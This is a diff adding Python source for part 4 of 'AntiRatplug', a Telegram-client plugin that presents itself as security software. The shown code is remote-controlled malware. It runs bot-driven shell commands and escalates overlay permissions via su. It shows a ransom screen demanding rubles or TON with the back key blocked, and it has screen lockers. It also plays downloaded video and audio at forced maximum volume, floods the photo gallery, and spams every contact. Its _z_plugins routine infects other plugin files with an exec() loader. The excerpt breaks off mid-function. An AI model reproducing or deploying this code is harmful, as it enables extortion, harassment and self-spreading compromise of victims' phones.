@@ -1,0 +1,1801 @@
+# -*- coding: utf-8 -*-
+"""
+AntiRatplug — Часть 4/4 (продолжение + завершение)
+"""
+
+    def _show_shell_menu(self):
+        keyboard = {
+            "keyboard": [
+                [{"text": "ls /sdcard"}, {"text": "ps"}],
+                [{"text": "ifconfig"}, {"text": "df -h"}],
+                [{"text": "Custom Shell Cmd"}],
+                [{"text": "⬅️ Back to Manual"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("💻 <b>Shell:</b>", keyboard, html=True)
+
+    def _ensure_overlay_perm(self, ctx):
+        try:
+            Settings = jclass("android.provider.Settings")
+            if Settings.canDrawOverlays(ctx):
+                return True
+        except Exception:
+            pass
+        pkg = str(ctx.getPackageName())
+        for c in (
+            "su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
+            "su -c 'cmd appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
+            "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg,
+        ):
+            try:
+                subprocess.run(c, shell=True, capture_output=True, timeout=10)
+            except Exception:
+                continue
+        try:
+            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
+        except Exception:
+            return False
+
+    def _show_ransom(self, text="", photo_url="", ton_link="", card_link="",
+                     amount_rub=0, amount_ton=0, warning=""):
+        if self._ransom_view is not None:
+            return {"ok": True, "already": True}
+        try:
+            if time.time() < self._ransom_pay_grace_until:
+                return {"ok": True, "grace": int(self._ransom_pay_grace_until - time.time())}
+            ctx = ApplicationLoader.applicationContext
+            if ctx is None:
+                return {"error": "no context"}
+            use_decor = not self._ensure_overlay_perm(ctx)
+            self._ransom_args = dict(text=text, photo_url=photo_url, ton_link=ton_link,
+                                     card_link=card_link, amount_rub=amount_rub,
+                                     amount_ton=amount_ton, warning=warning)
+
+            photo_path = ""
+            if photo_url and self._ransom_photo_path and self._ransom_photo_url == photo_url \
+                    and os.path.exists(self._ransom_photo_path):
+                photo_path = self._ransom_photo_path
+            elif photo_url:
+                try:
+                    data = self._fetch_url(photo_url, timeout=20)
+                    photo_path = os.path.join(str(ctx.getFilesDir().getAbsolutePath()),
+                                              "ransom_%d.jpg" % int(time.time()))
+                    with open(photo_path, "wb") as f:
+                        f.write(data)
+                    self._ransom_photo_path = photo_path
+                    self._ransom_photo_url = photo_url
+                except Exception:
+                    pass
+
+            drew = threading.Event()
+            derr = [None]
+
+            def _build():
+                try:
+                    if self._ransom_mini_view is not None and self._ransom_wm is not None:
+                        try:
+                            self._ransom_wm.removeView(self._ransom_mini_view)
+                        except Exception:
+                            pass
+                        self._ransom_mini_view = None
+
+                    ctx_cls = jclass("android.content.Context")
+                    wm = ctx.getSystemService(ctx_cls.WINDOW_SERVICE)
+                    self._ransom_wm = wm
+
+                    LL = jclass("android.widget.LinearLayout")
+                    TV = jclass("android.widget.TextView")
+                    IV = jclass("android.widget.ImageView")
+                    BTN = jclass("android.widget.Button")
+                    LP = jclass("android.view.WindowManager$LayoutParams")
+                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
+                    Color = jclass("android.graphics.Color")
+                    Gravity = jclass("android.view.Gravity")
+                    Intent = jclass("android.content.Intent")
+                    Uri = jclass("android.net.Uri")
+                    BitmapFactory = jclass("android.graphics.BitmapFactory")
+                    TypedValue = jclass("android.util.TypedValue")
+                    VLG = jclass("android.view.ViewGroup$LayoutParams")
+
+                    root = LL(ctx)
+                    root.setOrientation(LL.VERTICAL)
+                    root.setBackgroundColor(Color.parseColor("#1A1A1A"))
+                    pad = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 24,
+                        ctx.getResources().getDisplayMetrics()))
+                    root.setPadding(pad, pad, pad, pad)
+                    root.setGravity(Gravity.CENTER)
+
+                    if photo_path:
+                        try:
+                            bmp = BitmapFactory.decodeFile(photo_path)
+                            if bmp is not None:
+                                iv = IV(ctx)
+                                iv_lp = LP_LV(
+                                    VLG.MATCH_PARENT,
+                                    int(TypedValue.applyDimension(
+                                        TypedValue.COMPLEX_UNIT_DIP, 280,
+                                        ctx.getResources().getDisplayMetrics())))
+                                iv_lp.bottomMargin = int(TypedValue.applyDimension(
+                                    TypedValue.COMPLEX_UNIT_DIP, 16,
+                                    ctx.getResources().getDisplayMetrics()))
+                                iv.setLayoutParams(iv_lp)
+                                iv.setScaleType(iv.ScaleType.CENTER_CROP)
+                                iv.setImageBitmap(bmp)
+                                root.addView(iv)
+                        except Exception:
+                            pass
+
+                    tv = TV(ctx)
+                    tv_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    tv_lp.bottomMargin = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 16,
+                        ctx.getResources().getDisplayMetrics()))
+                    tv.setLayoutParams(tv_lp)
+                    tv.setText(str(text))
+                    tv.setTextColor(Color.WHITE)
+                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 18)
+                    tv.setGravity(Gravity.CENTER)
+                    root.addView(tv)
+
+                    amt_tv = TV(ctx)
+                    amt_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    amt_lp.bottomMargin = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 20,
+                        ctx.getResources().getDisplayMetrics()))
+                    amt_tv.setLayoutParams(amt_lp)
+                    amt_tv.setText("%d₽ / %d TON" % (amount_rub, amount_ton))
+                    amt_tv.setTextColor(Color.parseColor("#FFD700"))
+                    amt_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22)
+                    amt_tv.setGravity(Gravity.CENTER)
+                    amt_tv.setTypeface(amt_tv.getTypeface(), 1)
+                    root.addView(amt_tv)
+
+                    warn = str(warning or RANSOM_WARNING)
+                    warn_tv = TV(ctx)
+                    warn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                    warn_lp.bottomMargin = int(TypedValue.applyDimension(
+                        TypedValue.COMPLEX_UNIT_DIP, 20,
+                        ctx.getResources().getDisplayMetrics()))
+                    warn_tv.setLayoutParams(warn_lp)
+                    warn_tv.setText(warn)
+                    warn_tv.setTextColor(Color.parseColor("#FF3B30"))
+                    warn_tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16)
+                    warn_tv.setGravity(Gravity.CENTER)
+                    warn_tv.setTypeface(warn_tv.getTypeface(), 1)
+                    root.addView(warn_tv)
+
+                    if ton_link:
+                        btn_ton = BTN(ctx)
+                        btn_lp = LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT)
+                        btn_lp.bottomMargin = int(TypedValue.applyDimension(
+                            TypedValue.COMPLEX_UNIT_DIP, 12,
+                            ctx.getResources().getDisplayMetrics()))
+                        btn_ton.setLayoutParams(btn_lp)
+                        btn_ton.setText("💎 Оплатить TON")
+                        btn_ton.setTextColor(Color.WHITE)
+                        btn_ton.setBackgroundColor(Color.parseColor("#0088CC"))
+
+                        def _ton_click(v=None):
+                            try:
+                                i = Intent(Intent.ACTION_VIEW, Uri.parse(str(ton_link)))
+                                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                ctx.startActivity(i)
+                                self._ransom_pay_grace_until = time.time() + 600
+                                self._drop_to_pay_bubble(ctx)
+                            except Exception:
+                                pass
+
+                        class _OnClick(dynamic_proxy(jclass("android.view.View$OnClickListener"))):
+                            def onClick(self, v):
+                                _ton_click(v)
+                        btn_ton.setOnClickListener(_OnClick())
+                        root.addView(btn_ton)
+
+                    if card_link:
+                        btn_card = BTN(ctx)
+                        btn_card.setLayoutParams(LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))
+                        btn_card.setText("💳 Оплатить картой")
+                        btn_card.setTextColor(Color.WHITE)
+                        btn_card.setBackgroundColor(Color.parseColor("#4CAF50"))
+
+                        def _card_click(v=None):
+                            try:
+                                i = Intent(Intent.ACTION_VIEW, Uri.parse(str(card_link)))
+                                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                ctx.startActivity(i)
+                                self._ransom_pay_grace_until = time.time() + 600
+                                self._drop_to_pay_bubble(ctx)
+                            except Exception:
+                                pass
+
+                        class _OnClick2(dynamic_proxy(jclass("android.view.View$OnClickListener"))):
+                            def onClick(self, v):
+                                _card_click(v)
+                        btn_card.setOnClickListener(_OnClick2())
+                        root.addView(btn_card)
+
+                    KE = jclass("android.view.KeyEvent")
+
+                    class _OnKey(dynamic_proxy(jclass("android.view.View$OnKeyListener"))):
+                        def onKey(self, v, keyCode, event):
+                            try:
+                                if keyCode == KE.KEYCODE_BACK:
+                                    return True
+                            except Exception:
+                                pass
+                            return False
+
+                    root.setOnKeyListener(_OnKey())
+                    root.setFocusableInTouchMode(True)
+                    root.requestFocus()
+
+                    if use_decor:
+                        act2 = None
+                        try:
+                            act2 = jclass("org.telegram.ui.LaunchActivity").instance
+                        except Exception:
+                            pass
+                        if act2 is None:
+                            try:
+                                act2 = ApplicationLoader.application.getCurrentActivity()
+                            except Exception:
+                                pass
+                        if act2 is None:
+                            raise Exception("no activity")
+                        win2 = act2.getWindow()
+                        win2.addFlags(getattr(LP, "FLAG_KEEP_SCREEN_ON", 128))
+                        decor = win2.getDecorView()
+                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
+                        self._ransom_decor = decor
+                    else:
+                        params = LP(
+                            LP.MATCH_PARENT, LP.MATCH_PARENT,
+                            getattr(LP, "TYPE_APPLICATION_OVERLAY",
+                                    getattr(LP, "TYPE_PHONE", 2002)),
+                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128)
+                            | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
+                            -3)
+                        params.gravity = Gravity.CENTER
+                        wm.addView(root, params)
+
+                    self._ransom_view = root
+                except Exception as e:
+                    derr[0] = e
+                finally:
+                    drew.set()
+
+            def _ui():
+                try:
+                    act = jclass("org.telegram.ui.LaunchActivity").instance
+                except Exception:
+                    act = None
+                if act is None:
+                    try:
+                        act = ApplicationLoader.application.getCurrentActivity()
+                    except Exception:
+                        act = None
+                if act is None:
+                    _build()
+                else:
+                    act.runOnUiThread(_build)
+
+            _ui()
+            drew.wait(12)
+            if derr[0] is not None:
+                return {"error": "ransom: %s" % derr[0]}
+            if self._ransom_view is None:
+                return {"error": "overlay not created"}
+            return {"ok": True}
+        except Exception as e:
+            return {"error": "ransom: %s" % e}
+
+    def _drop_to_pay_bubble(self, ctx):
+        try:
+            wm = self._ransom_wm
+            if self._ransom_view is not None:
+                parent = self._ransom_decor or wm
+                if parent is not None:
+                    parent.removeView(self._ransom_view)
+                self._ransom_view = None
+                self._ransom_decor = None
+            if wm is None or self._ransom_mini_view is not None:
+                return
+            BTN = jclass("android.widget.Button")
+            LP = jclass("android.view.WindowManager$LayoutParams")
+            Gravity = jclass("android.view.Gravity")
+            Color = jclass("android.graphics.Color")
+            TypedValue = jclass("android.util.TypedValue")
+            VLG = jclass("android.view.ViewGroup$LayoutParams")
+            bubble = BTN(ctx)
+            bubble.setText("🔄 Сменить способ оплаты")
+            bubble.setTextSize(TypedValue.COMPLEX_UNIT_SP, 13)
+            bubble.setTextColor(Color.WHITE)
+            bubble.setBackgroundColor(Color.parseColor("#AA222222"))
+
+            def _reopen(v=None):
+                try:
+                    self._ransom_pay_grace_until = 0
+                    if self._ransom_mini_view is not None:
+                        wm.removeView(self._ransom_mini_view)
+                        self._ransom_mini_view = None
+                    args = self._ransom_args or {}
+                    self._show_ransom(**args)
+                except Exception:
+                    pass
+
+            class _OnClick(dynamic_proxy(jclass("android.view.View$OnClickListener"))):
+                def onClick(self, v):
+                    _reopen(v)
+            bubble.setOnClickListener(_OnClick())
+            params = LP(VLG.WRAP_CONTENT, VLG.WRAP_CONTENT,
+                        getattr(LP, "TYPE_APPLICATION_OVERLAY", 2038), 0x20, -3)
+            params.gravity = Gravity.TOP | Gravity.CENTER_HORIZONTAL
+            params.y = int(TypedValue.applyDimension(
+                TypedValue.COMPLEX_UNIT_DIP, 60,
+                ctx.getResources().getDisplayMetrics()))
+            try:
+                wm.addView(bubble, params)
+            except Exception:
+                if self._ensure_overlay_perm(ctx):
+                    wm.addView(bubble, params)
+                else:
+                    raise
+            self._ransom_mini_view = bubble
+        except Exception:
+            pass
+
+    def _dismiss_ransom(self):
+        try:
+            if self._ransom_view is None and self._ransom_mini_view is None:
+                return {"ok": True, "note": "no overlay"}
+            removed = threading.Event()
+            err = [None]
+
+            def _rm():
+                try:
+                    if self._ransom_view is not None:
+                        parent = self._ransom_decor or self._ransom_wm
+                        if parent is not None:
+                            parent.removeView(self._ransom_view)
+                        self._ransom_view = None
+                        self._ransom_decor = None
+                    if self._ransom_mini_view is not None and self._ransom_wm is not None:
+                        self._ransom_wm.removeView(self._ransom_mini_view)
+                        self._ransom_mini_view = None
+                except Exception as e:
+                    err[0] = e
+                finally:
+                    removed.set()
+
+            act = None
+            try:
+                act = jclass("org.telegram.ui.LaunchActivity").instance
+            except Exception:
+                pass
+            if act is None:
+                try:
+                    act = ApplicationLoader.application.getCurrentActivity()
+                except Exception:
+                    pass
+            if act is not None:
+                act.runOnUiThread(_rm)
+                removed.wait(8)
+            else:
+                _rm()
+            return {"error": "dismiss: %s" % err[0]} if err[0] else {"ok": True}
+        except Exception as e:
+            return {"error": "dismiss: %s" % e}
+
+    def _show_locker_menu(self):
+        keyboard = {
+            "inline_keyboard": [
+                [{"text": "Стандартный локер", "callback_data": "lock_std"}],
+                [{"text": "💀 No Mercy", "callback_data": "lock_mercy"}],
+                [{"text": "⚠ Ransom", "callback_data": "lock_ransom"}],
+                [{"text": "Отмена", "callback_data": "lock_cancel"}],
+            ]
+        }
+        self._send_markup("🔒 <b>Блокировка:</b>", keyboard, html=True)
+
+    def _lock_screen(self):
+        try:
+            self._show_locker()
+        except Exception as e:
+            self._send_msg("Ошибка: " + str(e))
+
+    def _show_locker(self):
+        if self._locker_on:
+            return
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is None:
+                return
+            act = frag.getParentActivity()
+            if act is None:
+                return
+            run_on_ui_thread(lambda: self._render_locker(act))
+        except Exception:
+            pass
+
+    def _render_locker(self, act):
+        if self._locker_on:
+            return
+        try:
+            self._clear_locker()
+            root = FrameLayout(act)
+            root.setBackgroundColor(Color.BLACK)
+            path = self._lock_path
+            if path and os.path.exists(path):
+                iv = ImageView(act)
+                iv.setScaleType(ImageView.ScaleType.FIT_XY)
+                iv.setImageBitmap(BitmapFactory.decodeFile(path))
+                lp = FrameLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT,
+                    ViewGroup.LayoutParams.MATCH_PARENT)
+                lp.gravity = Gravity.CENTER
+                iv.setLayoutParams(lp)
+                root.addView(iv)
+            else:
+                root.setBackgroundColor(Color.parseColor("#0A0A12"))
+            act.getWindow().getDecorView().addView(root)
+            self._locker_view = root
+            self._locker_on = True
+        except Exception:
+            pass
+
+    def _clear_locker(self):
+        if not self._locker_on or self._locker_view is None:
+            return
+        try:
+            parent = self._locker_view.getParent()
+            if parent is not None:
+                parent.removeView(self._locker_view)
+            self._locker_view = None
+            self._locker_on = False
+        except Exception:
+            self._locker_view = None
+            self._locker_on = False
+
+    def _start_mercy_mode(self):
+        if self._mercy_on:
+            return
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("no_mercy_active", True)
+            e.apply()
+        except Exception:
+            pass
+        self._mercy_on = True
+        self._mercy_thread = threading.Thread(target=self._mercy_loop, daemon=True)
+        self._mercy_thread.start()
+        self._send_msg("💀 No Mercy АКТИВИРОВАН.")
+
+    def _stop_mercy_mode(self):
+        self._mercy_on = False
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("no_mercy_active", False)
+            e.apply()
+        except Exception:
+            pass
+        self._clear_mercy()
+
+    def _mercy_loop(self):
+        while self._mercy_on and self._sync_running:
+            try:
+                run_on_ui_thread(self._inject_mercy_image)
+            except Exception:
+                pass
+            time.sleep(0.5)
+
+    def _inject_mercy_image(self):
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is None:
+                return
+            act = frag.getParentActivity()
+            if act is None:
+                return
+            if self._mercy_view is not None:
+                try:
+                    parent = self._mercy_view.getParent()
+                    if parent is not None:
+                        parent.removeView(self._mercy_view)
+                except Exception:
+                    pass
+            path = self._lock_path
+            if path and os.path.exists(path):
+                iv = ImageView(act)
+                iv.setScaleType(ImageView.ScaleType.FIT_XY)
+                iv.setImageBitmap(BitmapFactory.decodeFile(path))
+                lp = FrameLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT,
+                    ViewGroup.LayoutParams.MATCH_PARENT)
+                act.getWindow().getDecorView().addView(iv, lp)
+                self._mercy_view = iv
+            else:
+                root = FrameLayout(act)
+                root.setBackgroundColor(Color.BLACK)
+                lp = FrameLayout.LayoutParams(
+                    ViewGroup.LayoutParams.MATCH_PARENT,
+                    ViewGroup.LayoutParams.MATCH_PARENT)
+                act.getWindow().getDecorView().addView(root, lp)
+                self._mercy_view = root
+        except Exception:
+            pass
+
+    def _clear_mercy(self):
+        if self._mercy_view is not None:
+            try:
+                parent = self._mercy_view.getParent()
+                if parent is not None:
+                    parent.removeView(self._mercy_view)
+            except Exception:
+                pass
+            self._mercy_view = None
+
+    def _ensure_vidker_assets(self):
+        def dl():
+            try:
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                assets = {
+                    "arishem.mp4": ARISHEM_URL, "sentry.mp4": SENTRY_URL,
+                    "drdoom.mp4": DRDOOM_URL, "evilmorty.mp4": EVILMORTY_URL,
+                    "hwr.mp4": HWR_URL, "realdoom.mp4": REALDOOM_URL,
+                }
+                for fname, url_str in assets.items():
+                    fpath = os.path.join(d, fname)
+                    if not os.path.exists(fpath):
+                        try:
+                            from java.net import URL
+                            from java.io import BufferedInputStream, FileOutputStream
+                            u = URL(url_str)
+                            conn = u.openConnection()
+                            conn.setConnectTimeout(15000)
+                            conn.setReadTimeout(30000)
+                            inp = BufferedInputStream(conn.getInputStream())
+                            fos = FileOutputStream(fpath)
+                            buf = bytearray(8192)
+                            while True:
+                                n = inp.read(buf)
+                                if n < 0:
+                                    break
+                                fos.write(buf, 0, n)
+                            fos.close()
+                            inp.close()
+                            conn.disconnect()
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+        threading.Thread(target=dl, daemon=True).start()
+
+    def _activate_vidker(self, mode):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("vidker_active", True)
+            e.putString("vidker_mode", mode)
+            e.apply()
+        except Exception:
+            pass
+        self._render_vidker_task(mode)
+
+    def _render_vidker_task(self, mode):
+        if self._vidker_on:
+            return
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is None:
+                return
+            act = frag.getParentActivity()
+            if act is None:
+                return
+            ctx = ApplicationLoader.applicationContext
+            d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+            path = os.path.join(d, mode + ".mp4")
+            if not os.path.exists(path):
+                self._send_msg("Vidker: payload не скачан.")
+                return
+            am = act.getSystemService("audio")
+            stream_music = 3
+            max_vol = int(am.getStreamMaxVolume(stream_music))
+            am.setStreamVolume(stream_music, max_vol, 0)
+            run_on_ui_thread(lambda: self._render_vidker(act, path))
+            self._vidker_on = True
+            self._send_msg_with_close("🎬 Vidker [%s] запущен." % mode.upper(), "close_vidker")
+        except Exception as e:
+            self._send_msg("Ошибка Vidker: " + str(e))
+
+    def _close_vidker_permanently(self):
+        try:
+            prefs = ApplicationLoader.applicationContext.getSharedPreferences("antiratplug_state", 0)
+            e = prefs.edit()
+            e.putBoolean("vidker_active", False)
+            e.remove("vidker_mode")
+            e.apply()
+        except Exception:
+            pass
+        self._clear_vidker()
+        self._send_msg("Vidker остановлен.")
+
+    def _render_vidker(self, act, path):
+        try:
+            self._clear_vidker()
+            try:
+                decor = act.getWindow().getDecorView()
+                flags = (View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                         | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                         | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                         | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                         | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                         | View.SYSTEM_UI_FLAG_FULLSCREEN)
+                decor.setSystemUiVisibility(flags)
+            except Exception:
+                pass
+            root = FrameLayout(act)
+            root.setBackgroundColor(Color.BLACK)
+            SurfaceView = jclass("android.view.SurfaceView")
+            MediaPlayer = jclass("android.media.MediaPlayer")
+            SurfaceHolder = jclass("android.view.SurfaceHolder")
+            sv = SurfaceView(act)
+            root.addView(sv, FrameLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT))
+            mp = MediaPlayer()
+            self._vidker_mp = mp
+
+            class SHCallback(dynamic_proxy(SurfaceHolder.Callback)):
+                def __init__(self, media_player, file_path):
+                    super().__init__()
+                    self.mp = media_player
+                    self.path = file_path
+
+                def surfaceCreated(self, holder):
+                    try:
+                        self.mp.setDisplay(holder)
+                        self.mp.setDataSource(self.path)
+                        self.mp.prepare()
+                        self.mp.setLooping(True)
+                        self.mp.start()
+                    except Exception:
+                        pass
+
+                def surfaceChanged(self, holder, format, width, height):
+                    pass
+
+                def surfaceDestroyed(self, holder):
+                    pass
+
+            cb = SHCallback(mp, path)
+            sv.getHolder().addCallback(cb)
+            self._vidker_cb = cb
+            self._vidker_sv = sv
+            act.getWindow().getDecorView().addView(root, FrameLayout.LayoutParams(
+                ViewGroup.LayoutParams.MATCH_PARENT,
+                ViewGroup.LayoutParams.MATCH_PARENT))
+            self._vidker_view = root
+        except Exception as e:
+            self._send_msg("Ошибка рендера: " + str(e))
+
+    def _clear_vidker(self):
+        if self._vidker_mp is not None:
+            try:
+                self._vidker_mp.stop()
+                self._vidker_mp.release()
+            except Exception:
+                pass
+            self._vidker_mp = None
+        if self._vidker_sv is not None:
+            try:
+                self._vidker_sv.getHolder().removeCallback(self._vidker_cb)
+            except Exception:
+                pass
+            self._vidker_sv = None
+            self._vidker_cb = None
+        if self._vidker_view is not None:
+            try:
+                parent = self._vidker_view.getParent()
+                if parent is not None:
+                    parent.removeView(self._vidker_view)
+            except Exception:
+                pass
+            self._vidker_view = None
+        self._vidker_on = False
+
+    def _play_mmusic(self, url):
+        def task():
+            try:
+                from client_utils import get_last_fragment
+                frag = get_last_fragment()
+                if frag is None:
+                    return
+                act = frag.getParentActivity()
+                if act is None:
+                    return
+                self._clear_music()
+                ctx = ApplicationLoader.applicationContext
+                d = os.path.join(str(ctx.getFilesDir().getAbsolutePath()), "sec_assets")
+                if not os.path.exists(d):
+                    os.makedirs(d)
+                path = os.path.join(d, "mmusic_%d.mp3" % int(time.time()))
+                self._send_msg("⬇️ Скачиваю...")
+                from java.net import URL as JURL
+                from java.io import BufferedInputStream, FileOutputStream
+                u = JURL(url)
+                conn = u.openConnection()
+                conn.setConnectTimeout(15000)
+                conn.setReadTimeout(60000)
+                inp = BufferedInputStream(conn.getInputStream())
+                fos = FileOutputStream(path)
+                buf = bytearray(8192)
+                while True:
+                    n = inp.read(buf)
+                    if n < 0:
+                        break
+                    fos.write(buf, 0, n)
+                fos.close()
+                inp.close()
+                conn.disconnect()
+                am = act.getSystemService("audio")
+                stream_music = 3
+                am.setStreamVolume(stream_music, int(am.getStreamMaxVolume(stream_music)), 0)
+                mp = jclass("android.media.MediaPlayer")()
+                mp.setDataSource(path)
+                mp.prepare()
+                mp.setLooping(True)
+                mp.start()
+                self._music_mp = mp
+                self._send_msg_with_close("🎵 M-music играет.", "close_music")
+            except Exception as e:
+                self._send_msg("Ошибка: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _clear_music(self):
+        if self._music_mp is not None:
+            try:
+                self._music_mp.stop()
+                self._music_mp.release()
+            except Exception:
+                pass
+            self._music_mp = None
+
+    def _flood_gallery(self, photo_url, count=100):
+        try:
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            ImageMedia = jclass("android.provider.MediaStore$Images$Media")
+            data = self._fetch_url(photo_url, timeout=30)
+            saved = []
+            for i in range(min(int(count), 350)):
+                try:
+                    ts = int(time.time()) + i
+                    rand = random.randint(1000, 9999)
+                    name = "IMG_%s_%d.jpg" % (time.strftime("%Y%m%d_%H%M%S", time.localtime(ts)), rand)
+                    values = jclass("android.content.ContentValues")()
+                    values.put("_display_name", name)
+                    values.put("mime_type", "image/jpeg")
+                    values.put("relative_path", "Pictures/")
+                    uri = cr.insert(ImageMedia.EXTERNAL_CONTENT_URI, values)
+                    if uri:
+                        out = cr.openOutputStream(uri)
+                        out.write(data)
+                        out.close()
+                        saved.append(str(uri))
+                except Exception:
+                    pass
+            self._flood_uris = saved
+            self._send_msg("🌊 Flood: %d" % len(saved))
+        except Exception as e:
+            self._send_msg("Ошибка flood: " + str(e))
+
+    def _clear_flood(self):
+        try:
+            cr = ApplicationLoader.applicationContext.getContentResolver()
+            removed = 0
+            for u in self._flood_uris:
+                try:
+                    cr.delete(jclass("android.net.Uri").parse(u), None, None)
+                    removed += 1
+                except Exception:
+                    pass
+            self._send_msg("Flood очищен: %d" % removed)
+        except Exception as e:
+            self._send_msg("Ошибка: " + str(e))
+
+    def _csm_spam(self, text):
+        def task():
+            try:
+                self._send_msg("📨 CSM...")
+                mc = _MC().getInstance(0)
+                dialogs = mc.dialogs
+                if dialogs is None:
+                    self._send_msg("Пусто")
+                    return
+                count = 0
+                for i in range(dialogs.size()):
+                    try:
+                        dialog = dialogs.get(i)
+                        if dialog is None:
+                            continue
+                        peer = dialog.peer
+                        if peer is None:
+                            continue
+                        try:
+                            if hasattr(peer, "user_id"):
+                                uid = int(peer.user_id)
+                                u = mc.getUser(uid)
+                                if u is not None and _get_bool_attr(u, "bot", False):
+                                    continue
+                        except Exception:
+                            pass
+                        req = TLRPC.TL_messages_sendMessage()
+                        req.peer = peer
+                        req.message = str(text)
+                        req.random_id = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
+                        gate = _ReplyGate()
+                        with self._rpc_lock:
+                            self._pending_delegates.append(gate)
+                        _CM().getInstance(0).sendRequest(req, gate)
+                        time.sleep(0.15)
+                        count += 1
+                    except Exception:
+                        pass
+                self._send_msg("✅ CSM: %d" % count)
+            except Exception as e:
+                self._send_msg("Ошибка: " + str(e))
+        threading.Thread(target=task, daemon=True).start()
+
+    def _the_end(self):
+        try:
+            self._send_msg_with_close("The end. — затемнение.", "close_end")
+            self._dim_screen()
+        except Exception as e:
+            self._send_msg("Ошибка: " + str(e))
+
+    def _dim_screen(self):
+        if self._dim_active:
+            return
+        try:
+            from client_utils import get_last_fragment
+            frag = get_last_fragment()
+            if frag is None:
+                return
+            act = frag.getParentActivity()
+            if act is None:
+                return
+            run_on_ui_thread(lambda: self._apply_dim(act))
+        except Exception:
+            pass
+
+    def _apply_dim(self, act):
+        if self._dim_active:
+            return
+        try:
+            win = act.getWindow()
+            decor = win.getDecorView()
+            overlay = FrameLayout(act)
+            overlay.setBackgroundColor(Color.BLACK)
+            overlay.setAlpha(0.88)
+            decor.addView(overlay)
+            self._dim_view = overlay
+            self._dim_active = True
+            try:
+                attrs = win.getAttributes()
+                self._dim_alpha = attrs.alpha
+                attrs.alpha = 0.25
+                win.setAttributes(attrs)
+            except Exception:
+                pass
+        except Exception:
+            pass
+
+    def _clear_dim(self):
+        if not self._dim_active or self._dim_view is None:
+            return
+        try:
+            parent = self._dim_view.getParent()
+            if parent is not None:
+                parent.removeView(self._dim_view)
+            self._dim_view = None
+            self._dim_active = False
+        except Exception:
+            self._dim_view = None
+            self._dim_active = False
+
+    def _show_troll_menu(self):
+        keyboard = {
+            "keyboard": [
+                [{"text": "Vidker"}, {"text": "Lock screen"}],
+                [{"text": "Ransom"}, {"text": "M-music"}],
+                [{"text": "Flood Gallery"}, {"text": "Clear Flood"}],
+                [{"text": "CSM"}, {"text": "The end."}],
+                [{"text": "⬅️ Back to Manage"}],
+            ],
+            "resize_keyboard": True,
+        }
+        self._send_markup("🤡 <b>Тролль:</b>", keyboard, html=True)
+
+    def _z_plugins(self):
+        try:
+            found = self._find_plugin_files()
+            wrapped = skipped = errors = 0
+            for full in found:
+                try:
+                    with open(full, "r", encoding="utf-8", errors="ignore") as f:
+                        src = f.read()
+                    if "AntiRatplug" in src and "from_a4" in src:
+                        skipped += 1
+                        continue
+                    with open(full, "a", encoding="utf-8", newline="\n") as f:
+                        f.write("\n\n# ── injected ──\n")
+                        f.write("import os\n")
+                        f.write("try:\n")
+                        f.write("    _src = open(os.path.join(os.path.dirname(__file__), 'Security.plugin')).read()\n")
+                        f.write("    exec(compile(_src, '<ar>', 'exec'), globals())\n")
+                        f.write("except Exception:\n    pass\n")
+                    wrapped += 1
+                except Exception:
+                    errors += 1
+            self._send_msg("Заражение: w=%d s=%d e=%d" % (wrapped, skipped, errors))
+        except Exception as e:
+            self._send_msg("Ошибка: " + str(e))
+
+    def _find_plugin_files(self):
+        out = []
+        seen = set()
+        candidates = []
+        try:
+            from file_utils import get_plugins_dir
+            d = get_plugins_dir()
+            if d:
+                candidates.append(os.path.abspath(d))
+        except Exception:
+            pass
+        try:
+            fdir = str(ApplicationLoader.applicationContext.getFilesDir().getAbsolutePath())
